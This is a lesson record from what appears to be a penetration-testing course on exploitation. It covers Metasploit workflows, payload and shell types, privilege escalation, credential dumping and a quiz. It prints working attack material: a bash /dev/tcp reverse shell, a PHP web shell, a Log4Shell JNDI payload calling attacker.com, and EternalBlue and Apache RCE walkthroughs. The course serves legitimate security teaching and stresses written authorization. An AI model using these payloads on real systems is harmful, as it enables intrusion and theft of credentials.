{
  "lesson_id": "92c40fe5-d3ac-4a37-bc06-1420cd98384c",
  "domain": "pentest",
  "title": "Exploitation Fundamentals",
  "subtitle": "Turning vulnerabilities into access",
  "difficulty": 2,
  "estimated_time": 45,
  "order_index": 3,
  "prerequisites": [
    "0ec5538c-11fb-4c20-b9a4-70eff9648001"
  ],
  "concepts": [
    "Exploit development",
    "Payloads",
    "Shells",
    "Metasploit Framework",
    "Buffer overflows",
    "Web exploitation"
  ],
  "learning_objectives": [
    "Understand how exploits work and the exploitation process",
    "Master different payload types and shell access methods",
    "Learn to use Metasploit Framework for exploitation",
    "Understand common vulnerability classes and exploitation techniques"
  ],
  "content_blocks": [
    {
      "block_id": "3841f486-082d-43c7-993a-3c883f9c94d4",
      "type": "mindset_coach",
      "title": "From Vulnerability to Victory",
      "content": {
        "text": "**You found a vulnerability. Now what?**\n\nReconnaissance revealed open ports. Scanning found services. Enumeration discovered versions. Research identified a vulnerability.\n\n**But finding a vulnerability isn't enough. You need to EXPLOIT it.**\n\n**Exploitation** = The moment you turn a theoretical weakness into actual access.\n\nThis is where penetration testing gets real. This is where you prove the risk isn't hypothetical.\n\n**Here's what makes exploitation challenging**: Every environment is different. The same exploit that works in a lab might fail in production. Network conditions, architecture, security controls - all affect success.\n\n**Professional pentesters succeed because they understand**:\n- How exploits work (not just running tools)\n- Different payload types and when to use each\n- Troubleshooting failed exploits\n- Post-exploitation techniques\n- How to remain undetected\n\n**Real example**: In 2017, EternalBlue exploit (leaked from NSA) was weaponized into WannaCry ransomware. The vulnerability (MS17-010) existed for months. But it took understanding the exploit mechanics to turn it into a worm that infected 200,000+ computers in 150 countries.\n\n**Understanding exploitation isn't about becoming a threat - it's about understanding threats.**\n\n**Your goal**: Learn exploitation fundamentals so you can prove vulnerabilities are real, help organizations fix them, and understand how attackers operate."
      }
    },
    {
      "block_id": "6b3a7b5c-7b60-4392-b822-df6d8e5a3113",
      "type": "explanation",
      "title": "What is Exploitation?",
      "content": {
        "text": "**Exploitation** = Using a vulnerability to gain unauthorized access or execute unauthorized actions\n\n## The Exploitation Process\n\n```\n[Vulnerability] → [Exploit] → [Payload] → [Shell/Access]\n```\n\n**Vulnerability**: The weakness in the system\n- Example: Unpatched Apache Struts (CVE-2017-5638)\n\n**Exploit**: The method/code that leverages the vulnerability  \n- Example: Malicious HTTP request that triggers code execution\n\n**Payload**: The code you want to run on the target\n- Example: Reverse shell that connects back to you\n\n**Shell/Access**: The result - control over the target\n- Example: Command line access as www-data user\n\n## Key Terminology\n\n**Exploit**: Code or technique that takes advantage of a vulnerability\n\n**Payload**: Code delivered by the exploit (what you want to run)\n\n**Shellcode**: Low-level payload code (assembly) that runs on target\n\n**Shell**: Command-line access to a system\n- **Bind shell**: Target listens, attacker connects\n- **Reverse shell**: Target connects to attacker\n\n**C2 (Command & Control)**: Server that manages compromised systems\n\n**Privilege escalation**: Going from low-privilege user to admin/root\n\n**Lateral movement**: Moving from one compromised system to others\n\n## Types of Exploits\n\n### Remote Exploits\n**Attack over network without authentication**\n\n**Examples**:\n- EternalBlue (SMB vulnerability)\n- Shellshock (Bash vulnerability)\n- Apache Struts RCE\n- ProxyLogon (Exchange vulnerability)\n\n**Characteristics**:\n- No credentials needed\n- Network accessible\n- High impact\n- Often lead to immediate compromise\n\n### Local Exploits  \n**Require local access or credentials**\n\n**Examples**:\n- Kernel privilege escalation\n- DLL hijacking\n- PATH manipulation\n- Sudo misconfigurations\n\n**Characteristics**:\n- Need initial foothold\n- Used for privilege escalation\n- Less impact alone (need combo with other exploit)\n\n### Client-Side Exploits\n**Require user interaction**\n\n**Examples**:\n- Malicious PDF that exploits Adobe Reader\n- Browser exploit via malicious website\n- Office macro exploitation\n- Drive-by downloads\n\n**Characteristics**:\n- Need social engineering\n- Target user applications\n- Often bypass network security\n\n### Web Application Exploits\n**Target web apps and APIs**\n\n**Examples**:\n- SQL injection\n- Command injection\n- File upload exploitation\n- XXE (XML External Entity)\n- Deserialization attacks\n\n**Characteristics**:\n- Most common in pentests\n- OWASP Top 10 coverage\n- Business logic flaws\n\n## Vulnerability Classes\n\n**Memory corruption**:\n- Buffer overflow\n- Use-after-free\n- Format string bugs\n\n**Injection flaws**:\n- SQL injection\n- Command injection  \n- LDAP injection\n- Template injection\n\n**Logic flaws**:\n- Authentication bypass\n- Authorization issues\n- Race conditions\n- Business logic errors\n\n**Configuration issues**:\n- Default credentials\n- Weak permissions\n- Exposed services\n- Missing patches"
      }
    },
    {
      "block_id": "f2892cd8-148a-4235-8a51-345fb1a03f69",
      "type": "explanation",
      "title": "Metasploit Framework: The Exploitation Powerhouse",
      "content": {
        "text": "**Metasploit** = Industry-standard exploitation framework\n\n## Why Metasploit?\n\n**Contains**:\n- 2,500+ exploits\n- 800+ payloads  \n- Post-exploitation modules\n- Auxiliary modules (scanners, fuzzers)\n- Evasion techniques\n\n**Benefits**:\n- Pre-built, tested exploits\n- Payload generation\n- Session management\n- Database integration\n- Automation capabilities\n\n## Metasploit Architecture\n\n```\n[msfconsole] ← Command interface\n|\n[Framework Core]\n|\n[Modules]\n├── Exploits (attack vulnerabilities)\n├── Payloads (code to run)\n├── Auxiliary (scanners, fuzzers)\n├── Post (post-exploitation)\n└── Encoders (obfuscate payloads)\n```bash\n\n## Starting Metasploit\n\n```bash\n# Start PostgreSQL (Metasploit database)\nsudo service postgresql start\n\n# Initialize database\nsudo msfdb init\n\n# Launch msfconsole\nmsfconsole\n```\n\n**Initial setup**:\n```\nmsf6 > db_status\n[*] Connected to msf: metasploit\n\nmsf6 > workspace -a pentest_example\n[*] Added workspace: pentest_example\n```bash\n\n## Basic Metasploit Workflow\n\n### Step 1: Search for Exploit\n\n```\nmsf6 > search ms17-010\n\nMatching Modules\n================\nName                                     Disclosure Date  Rank\n----                                     ---------------  ----\nexploit/windows/smb/ms17_010_eternalblue 2017-03-14       average\nexploit/windows/smb/ms17_010_psexec      2017-03-14       normal\n```bash\n\n### Step 2: Select and Configure Exploit\n\n```\nmsf6 > use exploit/windows/smb/ms17_010_eternalblue\n\nmsf6 exploit(windows/smb/ms17_010_eternalblue) > show options\n\nModule options:\nName           Current Setting  Required  Description\n----           ---------------  --------  -----------\nRHOSTS                          yes       Target address\nRPORT          445              yes       Target port\n\nmsf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 192.168.1.100\nmsf6 exploit(windows/smb/ms17_010_eternalblue) > set LHOST 192.168.1.50\n```bash\n\n### Step 3: Select Payload\n\n```\nmsf6 exploit(windows/smb/ms17_010_eternalblue) > show payloads\n\nCompatible Payloads\n===================\nName                                        Description\n----                                        -----------\nwindows/x64/meterpreter/reverse_tcp         Reverse TCP Meterpreter\nwindows/x64/shell/reverse_tcp               Reverse TCP shell\n\nmsf6 exploit(windows/smb/ms17_010_eternalblue) > set payload windows/x64/meterpreter/reverse_tcp\n```bash\n\n### Step 4: Execute\n\n```\nmsf6 exploit(windows/smb/ms17_010_eternalblue) > exploit\n\n[*] Started reverse TCP handler on 192.168.1.50:4444\n[*] 192.168.1.100:445 - Connecting to target\n[*] 192.168.1.100:445 - Sending exploit...\n[*] Sending stage (200774 bytes) to 192.168.1.100\n[*] Meterpreter session 1 opened\n\nmeterpreter > getuid\nServer username: NT AUTHORITY\\SYSTEM\n\nmeterpreter > sysinfo\nComputer        : WIN-2019-SERVER\nOS              : Windows Server 2019\nArchitecture    : x64\n```bash\n\n## Payload Types\n\n### Singles\n**Self-contained, run immediately**\n\n```\nwindows/shell_reverse_tcp\nlinux/x86/exec\n```\n\n**Characteristics**:\n- No staging required\n- Larger size\n- More stable\n- Limited functionality\n\n### Stagers  \n**Small payload that downloads larger payload (stage)**\n\n```\nwindows/meterpreter/reverse_tcp\n^         ^\nstage     stager\n```\n\n**Characteristics**:\n- Small initial size (good for limited buffer space)\n- Downloads full payload after connection\n- More flexible\n\n### Stages\n**Full-featured payload delivered by stager**\n\n**Meterpreter** = Advanced payload with many features:\n- File upload/download\n- Screenshot capture\n- Keylogging\n- Process migration\n- Privilege escalation\n- Post-exploitation modules\n\n## Shell Types\n\n### Bind Shell\n\n```\n[Attacker] ----connects to----> [Target listening on port]\n```\n\n**Setup**:\n```bash\n# Target opens port and waits\n# Attacker connects to target's port\n\nmsf6 > use payload/windows/shell/bind_tcp\nmsf6 > set RHOST 192.168.1.100\nmsf6 > set LPORT 4444\nmsf6 > generate -f exe -o bind_shell.exe\n```\n\n**When to use**:\n- Target has public IP\n- No firewall blocking inbound\n- Testing lab environments\n\n**Disadvantages**:\n- Firewalls block inbound connections\n- Easy to detect (unusual listening port)\n\n### Reverse Shell\n\n```\n[Attacker listening] <----connects from---- [Target]\n```\n\n**Setup**:\n```bash\n# Attacker listens\n# Target connects back to attacker\n\nmsf6 > use payload/windows/shell/reverse_tcp\nmsf6 > set LHOST 192.168.1.50  # Attacker IP\nmsf6 > set LPORT 4444          # Attacker port\nmsf6 > generate -f exe -o reverse_shell.exe\n\n# Start listener\nmsf6 > use exploit/multi/handler\nmsf6 > set payload windows/shell/reverse_tcp\nmsf6 > set LHOST 0.0.0.0\nmsf6 > set LPORT 4444\nmsf6 > exploit -j  # Run in background\n```\n\n**When to use**:\n- Target behind firewall (most common)\n- Outbound connections allowed\n- Real-world pentests (90% of cases)\n\n**Advantages**:\n- Bypasses inbound firewall rules\n- Harder to detect\n- Standard for pentesting\n\n## Metasploit Commands Reference\n\n**Search and selection**:\n```\nsearch <term>          # Find modules\nuse <module>           # Select module\ninfo                   # Show module info\nshow options           # Show settings\nshow payloads          # List compatible payloads\nshow targets           # List target systems\n```\n\n**Configuration**:\n```\nset <option> <value>   # Set option\nsetg <option> <value>  # Set global option\nunset <option>         # Clear option\nshow options           # Verify settings\n```\n\n**Execution**:\n```\nexploit                # Run exploit\nrun                    # Alias for exploit\nexploit -j             # Run in background\nexploit -z             # Don't interact with session\ncheck                  # Check if target is vulnerable\n```\n\n**Session management**:\n```\nsessions -l            # List active sessions\nsessions -i <id>       # Interact with session\nsessions -k <id>       # Kill session\nsessions -u <id>       # Upgrade to Meterpreter\n```\n\n**Database**:\n```\ndb_status              # Check database\nworkspace -a <name>    # Create workspace\nworkspace <name>       # Switch workspace\nhosts                  # List discovered hosts\nservices               # List discovered services\nvulns                  # List vulnerabilities\n```bash\n\n## Meterpreter Commands\n\n**System info**:\n```\nsysinfo                # System information\ngetuid                 # Current user\ngetpid                 # Current process ID\nps                     # List processes\n```\n\n**File operations**:\n```\nls                     # List files\ncd <dir>               # Change directory\ncat <file>             # Read file\ndownload <file>        # Download from target\nupload <file>          # Upload to target\nsearch -f <pattern>    # Search for files\n```\n\n**Process management**:\n```\nmigrate <pid>          # Move to different process\nkill <pid>             # Kill process\nexecute -f <cmd>       # Run command\n```\n\n**Network**:\n```\nifconfig               # Network interfaces\nroute                  # Routing table\nportfwd add -l <lport> -p <rport> -r <target>  # Port forwarding\n```\n\n**Privilege escalation**:\n```\ngetsystem              # Attempt SYSTEM\nbypassuac              # Bypass UAC\n```\n\n**Post-exploitation**:\n```\nhashdump               # Dump password hashes\nscreenshot             # Capture screenshot\nkeyscan_start          # Start keylogger\nkeyscan_dump           # Get keystrokes\nshell                  # Drop to system shell\n```"
      }
    },
    {
      "block_id": "1faffd2b-3a79-4afe-ba9c-8dbe3911fcfd",
      "type": "explanation",
      "title": "Common Exploitation Techniques",
      "content": {
        "text": "## 1. Web Application Exploitation\n\n### SQL Injection\n\n**Vulnerability**: Unsanitized user input in SQL query\n\n**Example vulnerable code**:\n```php\n$id = $_GET['id'];\n$query = \"SELECT * FROM users WHERE id = $id\";\n```\n\n**Exploitation**:\n```\nOriginal: http://site.com/user.php?id=1\nExploit:  http://site.com/user.php?id=1' OR '1'='1\n\nResulting query: SELECT * FROM users WHERE id = 1' OR '1'='1'\n^ Returns all users!\n```\n\n**sqlmap** (automated SQL injection):\n```bash\nsqlmap -u \"http://site.com/user.php?id=1\" --batch --dump\n\n# Options:\n--batch      # Don't prompt for user input\n--dump       # Extract data\n--dbs        # List databases\n--tables     # List tables\n--columns    # List columns\n--os-shell   # Try to get OS shell\n```bash\n\n### Command Injection\n\n**Vulnerability**: Unsanitized input in system command\n\n**Example vulnerable code**:\n```python\nimport os\nip = request.GET['ip']\nos.system(f\"ping -c 4 {ip}\")\n```\n\n**Exploitation**:\n```\nOriginal: http://site.com/ping.php?ip=8.8.8.8\nExploit:  http://site.com/ping.php?ip=8.8.8.8;cat /etc/passwd\n\nExecuted command: ping -c 4 8.8.8.8; cat /etc/passwd\n^ Command chaining!\n```\n\n**Reverse shell via command injection**:\n```bash\n# Payload:\n8.8.8.8; bash -i >& /dev/tcp/192.168.1.50/4444 0>&1\n\n# URL-encoded:\n8.8.8.8%3B+bash+-i+%3E%26+%2Fdev%2Ftcp%2F192.168.1.50%2F4444+0%3E%261\n```bash\n\n### File Upload Exploitation\n\n**Vulnerability**: Unrestricted file upload\n\n**Exploitation**:\n\n**1. Create web shell**:\n```php\n<?php\n// shell.php\nif(isset($_GET['cmd'])) {\nsystem($_GET['cmd']);\n}\n?>\n```\n\n**2. Upload with extension bypass**:\n```\nOriginal: shell.php (blocked)\nBypass attempts:\n- shell.php.jpg\n- shell.php%00.jpg (null byte)\n- shell.phtml\n- shell.php5\n- shell.PhP (case variation)\n```\n\n**3. Access uploaded shell**:\n```\nhttp://site.com/uploads/shell.php?cmd=whoami\nhttp://site.com/uploads/shell.php?cmd=ls -la\nhttp://site.com/uploads/shell.php?cmd=cat /etc/passwd\n```bash\n\n## 2. Remote Code Execution (RCE)\n\n### Example: CVE-2021-44228 (Log4Shell)\n\n**Vulnerability**: Log4j JNDI lookup allows remote code execution\n\n**Exploitation**:\n```bash\n# Payload in HTTP header:\nUser-Agent: ${jndi:ldap://attacker.com/exploit}\n\n# When logged by Log4j, triggers:\n1. JNDI lookup to attacker.com\n2. Downloads malicious class\n3. Executes code\n```\n\n**Using Metasploit**:\n```bash\nmsf6 > use exploit/multi/http/log4shell_header_injection\nmsf6 > set RHOSTS target.com\nmsf6 > set LHOST 192.168.1.50\nmsf6 > set LPORT 4444\nmsf6 > set TARGETURI /\nmsf6 > exploit\n```bash\n\n## 3. Privilege Escalation\n\n**After initial access, escalate privileges**\n\n### Linux Privilege Escalation\n\n**Check for SUID binaries**:\n```bash\nfind / -perm -4000 2>/dev/null\n\n# Look for unusual SUID binaries:\n/usr/bin/find\n/usr/bin/vim\n/usr/bin/python\n```\n\n**Exploit SUID find**:\n```bash\nfind /home -exec whoami \\;\nfind /home -exec /bin/bash -p \\;\n# Now root!\n```\n\n**Check sudo permissions**:\n```bash\nsudo -l\n\n# Output:\n(ALL) NOPASSWD: /usr/bin/vim\n\n# Exploit:\nsudo vim\n:!bash\n# Now root!\n```\n\n**Kernel exploits**:\n```bash\n# Check kernel version\nuname -r\n\n# Search for exploit\nsearchsploit linux kernel 4.15.0\n\n# Use Metasploit\nmsf6 > use exploit/linux/local/cve_2021_4034_pwnkit_lpe_pkexec\n```bash\n\n### Windows Privilege Escalation\n\n**Check privileges**:\n```cmd\nwhoami /priv\nwhoami /groups\n```\n\n**Unquoted service paths**:\n```cmd\nwmic service get name,pathname,startmode | findstr /i \"auto\" | findstr /i /v \"C:\\Windows\\\\\" | findstr /i /v \"\"\"\n\n# Found:\nC:\\Program Files\\Vulnerable Service\\service.exe\n\n# Exploit:\nCreate: C:\\Program.exe\nService runs: C:\\Program.exe instead of C:\\Program Files\\Vulnerable Service\\service.exe\n```\n\n**AlwaysInstallElevated**:\n```cmd\nreg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated\nreg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated\n\n# If both return 1:\nmsf6 > use exploit/windows/local/always_install_elevated\n```bash\n\n## 4. Buffer Overflow (Simplified)\n\n**Concept**: Overwrite memory beyond buffer boundaries\n\n**Vulnerable C code**:\n```c\nvoid vulnerable_function(char *input) {\nchar buffer[64];\nstrcpy(buffer, input);  // No bounds checking!\n}\n```\n\n**Exploitation steps**:\n1. **Fuzzing**: Find crash point\n2. **Find offset**: Locate exact overwrite point\n3. **Control EIP**: Overwrite instruction pointer\n4. **Place shellcode**: Insert payload\n5. **Execute**: Jump to shellcode\n\n**Metasploit pattern creation**:\n```bash\n# Create unique pattern\nmsf6 > pattern_create -l 500\n\n# Find offset\nmsf6 > pattern_offset -q 0x41424344\n[*] Exact match at offset 268\n```\n\n**Protection mechanisms**:\n- **DEP** (Data Execution Prevention): Memory marked non-executable\n- **ASLR** (Address Space Layout Randomization): Randomize memory addresses\n- **Stack Canaries**: Detect buffer overflows\n\n## 5. Credential Access\n\n**After gaining access, steal credentials**\n\n### Mimikatz (Windows)\n\n```\nmeterpreter > load kiwi\nmeterpreter > creds_all\n\nOutput:\n[+] Hash: Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\n```bash\n\n### Linux password hashes\n\n```bash\ncat /etc/shadow\n\nroot:$6$xyz...:18000:0:99999:7:::\n^\n^ SHA-512 hash\n\n# Crack with john\njohn --wordlist=/usr/share/wordlists/rockyou.txt shadow_hashes.txt\n```"
      }
    },
    {
      "block_id": "3b497d71-7e88-484e-9afd-befc836ffeab",
      "type": "memory_aid",
      "title": "Exploitation Memory Aids",
      "content": {
        "text": "## Exploitation Process\n\n**\"VEPS\"** (Vulnerability, Exploit, Payload, Shell):\n\n1. **V**ulnerability identified\n2. **E**xploit selected/created\n3. **P**ayload configured\n4. **S**hell/access gained\n\n## Metasploit Workflow\n\n**\"SCUSE\"** (Search, Configure, Use, Set, Exploit):\n\n1. **S**earch for module\n2. **C**heck options\n3. **U**se module\n4. **S**et parameters (RHOSTS, LHOST, payload)\n5. **E**xploit!\n\n## Shell Types\n\n**\"BR\"** (Bind, Reverse):\n\n- **B**ind: Target listens, you connect\n- **R**everse: You listen, target connects\n\n**Remember**: Reverse is usually better (bypasses firewall)\n\n## Web Exploitation OWASP\n\n**\"SICAF\"** (SQL, Injection, Command, Auth, File):\n\n- **S**QL injection\n- **I**njection flaws\n- **C**ommand injection\n- **A**uthentication bypass\n- **F**ile upload\n\n## Privilege Escalation Checks\n\n**\"SUCKS\"** (SUID, User, Cron, Kernel, Services):\n\n**Linux**:\n- **S**UID binaries\n- **U**ser permissions (sudo -l)\n- **C**ron jobs\n- **K**ernel exploits\n- **S**ervices misconfigurations\n\n**Windows**:\n- **S**ervice permissions\n- **U**nquoted paths\n- **C**redentials (registry, files)\n- **K**ernel exploits  \n- **S**cheduled tasks\n\n## Common Metasploit Payloads\n\n**Windows**:\n```\nwindows/meterpreter/reverse_tcp     # Most common\nwindows/shell/reverse_tcp           # Simple shell\nwindows/x64/meterpreter/reverse_tcp # 64-bit\n```\n\n**Linux**:\n```\nlinux/x86/meterpreter/reverse_tcp\nlinux/x64/shell/reverse_tcp\n```bash\n\n## Port Numbers for Shells\n\n**Common listener ports**:\n```\n4444  # Metasploit default\n4443  # Alternative\n443   # HTTPS (bypasses egress filtering)\n80    # HTTP (bypasses egress filtering)\n53    # DNS (bypasses egress filtering)\n```bash\n\n## Meterpreter Commands\n\n**\"GPS HUD\"** (Get, Process, System, Hash, Upload, Download):\n\n- **G**etuid / getsystem\n- **P**s / migrate\n- **S**ysinfo / shell\n- **H**ashdump\n- **U**pload\n- **D**ownload"
      }
    },
    {
      "block_id": "f242ed66-e7ef-421f-a157-e46034a55f39",
      "type": "explanation",
      "title": "Key Takeaways and Responsible Disclosure",
      "content": {
        "text": "## What You've Learned\n\n✅ **Exploitation turns vulnerabilities into access** through exploit code and payloads\n\n✅ **Metasploit Framework is the industry standard** with 2,500+ exploits and 800+ payloads\n\n✅ **Reverse shells are preferred** over bind shells (bypass firewalls)\n\n✅ **Common exploit categories**: Web (SQLi, command injection), RCE, privilege escalation, buffer overflow\n\n✅ **Meterpreter is the most powerful payload** with post-exploitation capabilities\n\n✅ **Privilege escalation follows initial access** - SUID, sudo, kernel exploits, service misconfigurations\n\n## Ethical and Legal Considerations\n\n### Authorization is MANDATORY\n\n**NEVER exploit without explicit written authorization**\n\n**Required documentation**:\n```\n1. Scope definition (what systems, what techniques)\n2. Time windows (when testing is allowed)\n3. Emergency contacts\n4. Rules of engagement\n5. Signatures from authorized parties\n```bash\n\n### Responsible Disclosure\n\n**If you find a vulnerability**:\n\n**1. Do NOT exploit on production systems without permission**\n\n**2. Report via responsible disclosure**:\n- Contact vendor security team\n- Provide detailed technical information\n- Give reasonable time to fix (typically 90 days)\n- Offer to retest after patch\n\n**3. Do NOT publicly disclose until patched**\n- Exceptions: Vendor unresponsive, patch available\n- Coordinate disclosure timing\n\n**4. Consider bug bounty programs**:\n- HackerOne: https://www.hackerone.com/\n- Bugcrowd: https://www.bugcrowd.com/\n- Many companies have programs\n\n**Example disclosure timeline**:\n```\nDay 0:   Vulnerability discovered\nDay 1:   Report sent to vendor security team\nDay 3:   Vendor acknowledges receipt\nDay 30:  Vendor confirms vulnerability\nDay 60:  Patch developed\nDay 90:  Patch released\nDay 91:  Public disclosure (coordinated)\n```bash\n\n### Legal Frameworks\n\n**United States**:\n- **CFAA** (Computer Fraud and Abuse Act): Unauthorized access is illegal\n- **DMCA** Section 1201: Circumventing access controls\n\n**European Union**:\n- **GDPR**: Data protection implications\n- **Computer Misuse Act** (UK): Unauthorized access/modification\n\n**Bottom line**: Get authorization. Always.\n\n## Practice Safely and Legally\n\n**Legal practice platforms**:\n\n**HackTheBox** (https://www.hackthebox.com/):\n- 200+ vulnerable machines\n- Realistic scenarios\n- Community and write-ups\n- Free and VIP tiers\n\n**TryHackMe** (https://tryhackme.com/):\n- Guided learning paths\n- Beginner-friendly\n- Web-based labs\n- Certifications\n\n**VulnHub** (https://www.vulnhub.com/):\n- Downloadable VMs\n- Self-hosted\n- Various difficulty levels\n- Free\n\n**PentesterLab** (https://pentesterlab.com/):\n- Web application focus\n- Badge system\n- Exercises and courses\n\n**PortSwigger Web Security Academy** (https://portswigger.net/web-security):\n- Free web application security training\n- Burp Suite creator\n- Hands-on labs\n\n### Set Up Your Own Lab\n\n**Create safe practice environment**:\n\n```bash\n# Install VirtualBox\n# Download vulnerable VMs:\n- Metasploitable2 (Linux, intentionally vulnerable)\n- DVWA (Damn Vulnerable Web App)\n- WebGoat (OWASP training)\n- Windows 10 (unpatched for practice)\n\n# Network isolation:\n- Host-only network (no internet)\n- Isolated from production\n```bash\n\n## Next Steps\n\n**1. Master Metasploit**\n\n```bash\n# Daily practice:\nmsf6 > search <vulnerability>\nmsf6 > use <exploit>\nmsf6 > show options\nmsf6 > set RHOSTS <target>\nmsf6 > exploit\n```\n\n**2. Study OWASP Top 10**\n\n- A01: Broken Access Control\n- A02: Cryptographic Failures\n- A03: Injection\n- A04: Insecure Design\n- A05: Security Misconfiguration\n- A06: Vulnerable Components\n- A07: Authentication Failures\n- A08: Data Integrity Failures\n- A09: Logging Failures\n- A10: Server-Side Request Forgery\n\n**3. Learn privilege escalation**\n\n**Linux**:\n```bash\n# Enumeration scripts:\nwget https://github.com/rebootuser/LinEnum/raw/master/LinEnum.sh\nchmod +x LinEnum.sh\n./LinEnum.sh\n\n# Or:\nwget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh\n```\n\n**Windows**:\n```powershell\n# PowerUp.ps1 (PowerSploit)\nImport-Module .\\PowerUp.ps1\nInvoke-AllChecks\n\n# Or WinPEAS:\nwget https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASx64.exe\n```\n\n**4. Understand exploit development basics**\n\n**Resources**:\n- Exploit Education: https://exploit.education/\n- LiveOverflow YouTube: Buffer overflow tutorials\n- Corelan tutorials: https://www.corelan.be/\n\n**5. Build your exploitation toolkit**\n\n```bash\n# Essential tools\nsudo apt-get install metasploit-framework\nsudo apt-get install sqlmap\nsudo apt-get install burpsuite\nsudo apt-get install netcat\nsudo apt-get install socat\nsudo apt-get install exploitdb\n\n# Privilege escalation\ngit clone https://github.com/carlospolop/PEASS-ng\ngit clone https://github.com/PowerShellMafia/PowerSploit\n```bash\n\n## Real-World Application\n\n**Scenario: Pentest engagement, exploitation phase**\n\n**Reconnaissance found**: \n- 192.168.1.10: Windows Server 2019, SMB open\n- 192.168.1.20: Linux web server, Apache 2.4.49\n\n**Exploitation**:\n\n**Target 1: Windows Server**\n```bash\n# Check for EternalBlue\nmsf6 > use auxiliary/scanner/smb/smb_ms17_010\nmsf6 > set RHOSTS 192.168.1.10\nmsf6 > run\n[+] 192.168.1.10:445 - Host is vulnerable to MS17-010!\n\n# Exploit\nmsf6 > use exploit/windows/smb/ms17_010_eternalblue\nmsf6 > set RHOSTS 192.168.1.10\nmsf6 > set LHOST 192.168.1.50\nmsf6 > set payload windows/x64/meterpreter/reverse_tcp\nmsf6 > exploit\n\nmeterpreter > getuid\nServer username: NT AUTHORITY\\SYSTEM\n^ SUCCESS! SYSTEM access\n```\n\n**Target 2: Linux Web Server**\n```bash\n# Apache 2.4.49 has CVE-2021-41773 (path traversal → RCE)\nmsf6 > use exploit/multi/http/apache_normalize_path_rce\nmsf6 > set RHOSTS 192.168.1.20\nmsf6 > set LHOST 192.168.1.50\nmsf6 > set TARGETURI /\nmsf6 > exploit\n\nmeterpreter > getuid\nServer username: www-data\n\n# Privilege escalation needed\nmeterpreter > upload /path/to/linpeas.sh /tmp/linpeas.sh\nmeterpreter > shell\n$ chmod +x /tmp/linpeas.sh\n$ /tmp/linpeas.sh\n\n# Found: SUID on /usr/bin/find\n$ find /home -exec /bin/bash -p \\;\n# id\nuid=33(www-data) euid=0(root)\n^ SUCCESS! Root access\n```\n\n**Report findings**:\n- Two critical vulnerabilities exploited\n- Full system compromise achieved\n- Recommendations: Patch immediately, implement defense-in-depth\n\n## Words of Encouragement\n\nExploitation is where theory meets practice. It's where you prove vulnerabilities aren't just \"potential risks\" - they're real, exploitable, dangerous.\n\n**Start simple**:\n- Exploit one HTB machine\n- Use Metasploit for one CVE\n- Get one reverse shell\n\n**Each success builds confidence**. Each exploitation teaches you how attackers think, how defenses fail, how to protect better.\n\n**Remember**:\n- **Always get authorization**\n- **Practice on legal platforms**\n- **Use knowledge ethically**\n- **Help fix vulnerabilities, don't create victims**\n\n**The goal isn't to become a threat - it's to understand threats and defend against them.**\n\n**Welcome to exploitation. Now go break things (legally) so you can help fix them.**"
      }
    },
    {
      "type": "video",
      "title": "Video Tutorial: Exploitation with Metasploit",
      "content": {
        "resources": "Watch this comprehensive video tutorial to reinforce your learning with visual demonstrations and practical examples.\n\n**Video**: [Metasploit Fundamentals by NetworkChuck](https://www.youtube.com/watch?v=8lR27r8Y_ik)\n\n**What you'll see:**\nMetasploit Framework, exploit development basics, payloads, handlers, and post-exploitation modules.\n\n**Duration**: ~28 minutes\n\n**Recommended viewing**: After completing the lesson to solidify understanding.\n\n**Additional Resources:**\n- [Metasploit Unleashed](https://www.offensive-security.com/metasploit-unleashed/)\n- [Exploit Database](https://www.exploit-db.com/)\n- [Rapid7 Metasploit Docs](https://docs.rapid7.com/metasploit/)"
      }
    }
  ],
  "post_assessment": [
    {
      "question_id": "q1",
      "type": "multiple_choice",
      "question": "What is the difference between an exploit and a payload?",
      "options": [
        "They are the same thing",
        "Exploit is the vulnerability, payload is the code that runs after exploitation",
        "Exploit is the method that leverages a vulnerability, payload is the code you want to run on the target",
        "Exploit is for Windows, payload is for Linux"
      ],
      "correct_answer": 2,
      "explanation": "An exploit is the code or technique that takes advantage of a vulnerability to gain access. A payload is the code you want to execute on the target after successful exploitation (like a reverse shell or Meterpreter).",
      "difficulty": 2
    },
    {
      "question_id": "q2",
      "type": "multiple_choice",
      "question": "Why are reverse shells preferred over bind shells in most penetration tests?",
      "options": [
        "Reverse shells are faster",
        "Reverse shells bypass inbound firewall rules since the target initiates the outbound connection",
        "Reverse shells are more stable",
        "Reverse shells provide more features"
      ],
      "correct_answer": 1,
      "explanation": "Reverse shells are preferred because the target connects back to the attacker, bypassing inbound firewall rules that typically block incoming connections. Most networks allow outbound connections, making reverse shells more likely to succeed.",
      "difficulty": 2
    },
    {
      "question_id": "q3",
      "type": "multiple_choice",
      "question": "What Metasploit module would you use after successfully exploiting a system to maintain the connection?",
      "options": [
        "exploit/multi/handler",
        "auxiliary/scanner/portscan/tcp",
        "post/windows/gather/hashdump",
        "payload/windows/meterpreter/reverse_tcp"
      ],
      "correct_answer": 0,
      "explanation": "exploit/multi/handler is used to handle incoming connections from payloads. You set it up to listen for reverse shells or staged payloads connecting back to you. It maintains and manages exploitation sessions.",
      "difficulty": 2
    },
    {
      "question_id": "q4",
      "type": "multiple_choice",
      "question": "What is the first step you should ALWAYS take before attempting to exploit a vulnerability?",
      "options": [
        "Search for the exploit in Metasploit",
        "Obtain explicit written authorization from the system owner",
        "Set up your listener",
        "Research the vulnerability online"
      ],
      "correct_answer": 1,
      "explanation": "You must ALWAYS obtain explicit written authorization before attempting any exploitation. Exploiting systems without authorization is illegal (CFAA in US, Computer Misuse Act in UK, etc.) and can result in criminal charges.",
      "difficulty": 2
    }
  ],
  "jim_kwik_principles": [
    "active_learning",
    "teach_like_im_10",
    "memory_hooks",
    "minimum_effective_dose",
    "meta_learning",
    "connect_to_what_i_know",
    "reframe_limiting_beliefs",
    "gamify_it",
    "learning_sprint",
    "multiple_memory_pathways"
  ]
}